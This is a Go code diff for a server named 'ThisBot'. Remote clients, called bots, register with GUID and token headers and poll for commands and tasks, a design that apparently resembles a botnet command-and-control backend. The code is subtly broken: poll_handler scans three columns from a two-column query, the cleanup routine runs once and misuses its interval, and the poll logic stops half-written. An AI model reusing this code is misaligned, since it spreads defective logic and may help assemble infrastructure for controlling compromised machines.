@@ -2,17 +2,28 @@ package main
 
 import (
 	"ThisBot/common"
-	"ThisBot/db"
+	"ThisBot/db1"
 	"ThisBot/utils"
 	"database/sql"
 	"encoding/json"
 	"log"
 	"net/http"
 	"strconv"
+	"time"
 
 	"github.com/go-chi/chi/middleware"
 	"github.com/go-chi/chi/v5"
 )
+
+func task_cleaner(db *sql.DB, interval time.Duration) {
+	go func() {
+		time.Sleep(time.Duration(interval) * time.Second)
+		_, err := db1.Exec(db, `delete from tasks where status in ('done', 'failed', 'canceled') and completed_at < UTC_TIMESTAMP() - INTERVAL 3 DAY`)
+		if err != nil {
+			log.Println("Task cleanup error: " + err.Error())
+		}
+	}()
+}
 
 func http_sender(w http.ResponseWriter, guid, token string, reply *common.ServerReply) error {
 	server_time := utils.GenerateUtcTimestampString()
@@ -33,6 +44,8 @@ func http_sender(w http.ResponseWriter, guid, token string, reply *common.Server
 }
 
 func recovery_handler(w http.ResponseWriter, r *http.Request) {
+	log.Println("recovery_handler triggered")
+
 	guid := r.Header.Get("X-Guid")
 	time1 := r.Header.Get("X-Time")
 
@@ -48,13 +61,13 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 	out_guid := ""
 	out_token := ""
 	strSql := "select guid, token from clients where guid=?"
-	err := db.QueryRow(common.Db, strSql, guid).Scan(&out_guid, &out_token)
+	err := db1.QueryRow(common.Db, strSql, guid).Scan(&out_guid, &out_token)
 	if err == sql.ErrNoRows {
 		// No such bot, create bot
 		strSql = "insert into clients (guid, token, lastseen) values(?,?,?)"
 		// Generate new token
 		out_token = common.Base64Enc(utils.GenerateRandomBytes(32))
-		_, err = db.Insert(common.Db, strSql, guid, out_token, time1)
+		_, err = db1.Insert(common.Db, strSql, guid, out_token, time1)
 		if err != nil {
 			// Failed to create a bot
 			reply.Status = 0
@@ -72,7 +85,7 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 		reply.Args["Token"] = out_token
 		// Update timestamp lastseen
 		strSql = "update clients set lastseen=? where guid=?"
-		_, err = db.Exec(common.Db, strSql, time1, out_guid)
+		_, err = db1.Exec(common.Db, strSql, time1, out_guid)
 		if err != nil {
 			reply.Status = 0
 			reply.Error = "Find the bot but failed to update"
@@ -87,6 +100,38 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 }
 
 func poll_handler(w http.ResponseWriter, r *http.Request) {
+	log.Println("poll_handler triggered")
+	guid := r.Header.Get("X-Guid")
+	time1 := r.Header.Get("X-Time")
+	sign := r.Header.Get("X-Sign")
+
+	// Find bot in clients
+	var saved_guid string
+	var saved_token string
+	var saved_lastseen string
+	reply := common.ServerReply{
+		Args: make(map[string]any),
+	}
+
+	reply.Cmd = ""
+	reply.Error = ""
+	reply.Status = 1
+	reply.TaskId = 0
+
+	sqlStr := "select guid, token from clients where guid=?"
+	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_guid, &saved_token, &saved_lastseen)
+	if err == sql.ErrNoRows {
+		// Can't find bot
+		log.Println("can't find bot in poll handler" + err.Error())
+
+	} else if err != nil {
+		log.Println(err.Error())
+		reply.Status = 0
+		reply.Error = "Unknown error"
+	} else {
+		// Find it!
+
+	}
 
 }
 
